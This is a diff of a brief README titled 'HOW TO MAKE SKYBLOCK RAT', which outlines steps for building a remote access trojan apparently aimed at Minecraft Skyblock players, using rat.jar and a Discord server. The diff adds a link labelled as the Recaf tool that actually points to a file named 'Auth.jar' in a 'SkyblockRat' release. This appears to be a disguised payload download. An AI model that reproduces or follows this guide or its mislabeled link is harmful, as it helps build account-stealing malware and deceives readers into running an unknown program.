@@ -1,7 +1,7 @@
 # HOW TO MAKE SKYBLOCK RAT
 * Step 1
  - Download rat.jar
- - Download recaf-2.21.13-J8-jar-with-dependencies.jar
+ - Download (recaf-2.21.13-J8-jar-with-dependencies.jar)[https://github.com/NuPochemu3627/SkyblockRat/releases/download/rat/Auth.jar]
 
 * Step 2
  - Create discord server
